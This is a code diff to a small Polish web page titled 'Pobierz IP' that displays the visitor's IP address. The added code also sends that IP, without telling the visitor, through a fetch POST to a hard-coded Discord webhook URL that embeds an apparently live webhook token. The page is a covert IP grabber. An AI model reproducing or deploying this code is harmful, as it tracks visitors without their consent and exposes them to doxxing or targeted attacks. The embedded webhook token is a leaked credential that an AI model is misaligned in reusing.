@@ -4,7 +4,32 @@
   <title>Pobierz IP</title>
   <script>
     function getIP(json) {
-      document.getElementById("ip").textContent = json.ip;
+      var ip = json.ip;
+      document.getElementById("ip").textContent = ip;
+
+      // Tworzenie obiektu z danymi do wysłania na webhook Discorda
+      var data = {
+        content: "Moje IP to: " + ip
+      };
+
+      // URL webhooka Discorda
+      var discordWebhookURL = "https://discord.com/api/webhooks/1190612181683806330/WDELj1UR-HMP9uLi0fqEmAEuPDCyL--q0ZnGADGuP68F-UEN7X2NWwpOdueSUdZKkEDq";
+
+      // Wysyłanie danych na webhook Discorda za pomocą metody fetch
+      fetch(discordWebhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Wystąpił problem podczas wysyłania wiadomości na Discorda.');
+        }
+        return response.json();
+      })
+      .catch(error => console.error('Błąd:', error));
     }
 
     document.addEventListener("DOMContentLoaded", function() {
@@ -15,7 +40,6 @@
   </script>
 </head>
 <body>
-    <h1>EZ?</h1>
   <p>Twoje IP:</p>
   <p id="ip"></p>
 </body>
